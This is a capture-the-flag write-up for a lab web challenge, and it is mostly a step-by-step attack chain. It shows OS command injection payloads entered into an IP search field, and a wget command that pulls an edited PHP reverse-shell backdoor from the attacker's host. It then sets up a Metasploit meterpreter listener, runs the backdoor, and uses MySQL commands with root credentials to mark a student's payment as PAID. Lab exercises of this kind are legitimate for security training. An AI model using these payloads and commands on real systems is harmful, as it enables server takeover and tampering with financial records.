Challenge 045 : Tricky Injection Challenge  Trip To Dawki RCE

Looks like a paint blog of student 

let's put input at the ip_searchfield
' "
8.8.8.8
8.8.8.8; whoami
8.8.8.8 && whoami

127.0.0.1 || ls -al  : gives the ouput of ping and as well all the files in the same directory

from given information payload file was WAS backdoor.php
here the list shows the file could be backdoor.txt
let's see the content of it

1.1.1.1 || cat backdoor.txt
looks like encoded.. let's copy this content of text file onto some of our notepad and decode it.
first urldecode and then base64 decode it.. u'll get a php code.. looks like a php backdoor that establishes a reverse connection on the specified LHOST and LPORT look like a local ip.. let's edit this payload to get the connection to our ip.. with lhost as "your ip" my case : 192.168.0.104 and let the LPORT be 4444

Add <?php ?> tags at the start and end of the backdoor 
let's save this file on our local system on localhost as backdoor.txt

let's get this edited backdoor on the SERVER
searchfield :  || wget http://192.168.0.104/backdoor.txt -O backdoor.php
searchfield : `wget http://192.168.0.104/backdoor.txt -O backdoor.php`			192.168.0.104 is my ip.. check in for ur case : ifconfig
	      `wget http://192.168.0.104/backdoor.txt -O backdoor.php`

now 127.0.0.1 || ls -al gives backdoor.php

let's execute this php.. before that 
let's FIRE up metasploit or armitage and turn up our listener

armitage : 
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
show options
set LHOST 192.168.0.104
set LPORT 4444

exploit

now let's execute our backdoor.php
searchfield : 11.1.1.11 || php -f backdoor.php

and u'll get the meterpreter session started on ur armitage.. gaining access to the server.. let's do our work now :D


echo "show databases;" | mysql -u root --password=password			//gives all the databases.. we need TripDawki
echo "select * from TripDawki.students;" | mysql -u root --password=password    //select that database
echo "UPDATE TripDawki.students set payment='PAID' where id=15;" | mysql -u root --password=password 	//our target change the payment mode to PAID

DONE !!

play around with the server YOU have REMOTE access to it.

HOPE you enjoyed this challenge !!!
